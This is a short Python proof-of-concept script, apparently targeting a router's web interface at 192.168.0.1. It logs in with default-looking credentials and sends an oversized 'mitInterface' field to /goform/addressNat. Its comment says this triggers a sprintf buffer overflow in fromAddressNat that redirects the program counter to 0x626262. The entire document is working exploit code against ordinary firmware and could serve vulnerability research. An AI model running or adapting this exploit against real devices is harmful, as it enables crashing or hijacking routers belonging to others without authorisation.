#!/usr/bin/env python3

# bof in fromAddressNat - 0x493f10, using sprintf to trigger and get $pc to point to 0x626262

import common

t = common.Tendown('192.168.0.1', '80', 'user', 'user')
t.login()
p = {'mitInterface':'a'*0x308 + 'bbb'}
t.post_request('/goform/addressNat', p)
